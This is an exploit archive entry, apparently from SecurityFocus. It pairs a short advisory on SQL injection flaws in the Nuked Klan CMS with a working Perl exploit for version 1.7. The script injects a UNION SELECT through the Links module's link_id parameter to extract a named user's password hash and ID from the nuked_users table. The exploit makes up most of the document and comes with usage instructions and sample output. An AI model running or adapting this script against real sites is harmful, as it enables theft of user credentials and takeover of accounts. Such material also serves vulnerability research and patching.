source: http://www.securityfocus.com/bid/15181/info
   
Nuked Klan is prone to multiple SQL injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.
   
These vulnerabilities could permit remote attackers to pass malicious input to database queries, resulting in modification of query logic or other attacks.
   
Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation. 

#!/usr/bin/perl
use LWP::Simple;

if (@ARGV != 2)
{
print "\n Nuked klan 1.7: Remote Exploit\n";
print "---------------------------------------------\n\n";
print " Coded By Papipsycho for G00t R0t ?       \n Contact: papipsycho@hotmail.com\n\n";
print "[!] usage: perl $0 [host] [user]\n";
print "[?] exam: perl $0 http://127.0.0.1/nk/ papipsycho\n\n";
print "Result:\n";
print "[+]user: papipsycho\n";
print "[+]pass(md5): 05632060d4357d8927n28df514a1fb27\n";
print "[+]id: sliN4piN4t6r4tirlX6b\n\n";
print "---------------------------------------------\n\n";
exit ();
}

$adr = $ARGV[0]; # http://127.0.0.1/nk/
$user = $ARGV[1]; # user

$phase1 = "index.php?file=Links&op=description&link_id=1' UNION SELECT id, pass, pseudo, id, pass ,mail, niveau, count FROM `nuked_users` where pseudo =
'";
$phase2 = "' ORDER BY id DESC /*";
$url = $adr.$phase1.$user.$phase2;
$content = get($url);
print "[+]user: $user\n";
print "[+]pass(md5): ";
print $content =~ /(\w{32})/;
print "\n[+]id: ";
print $content =~ /(\w{20})/;

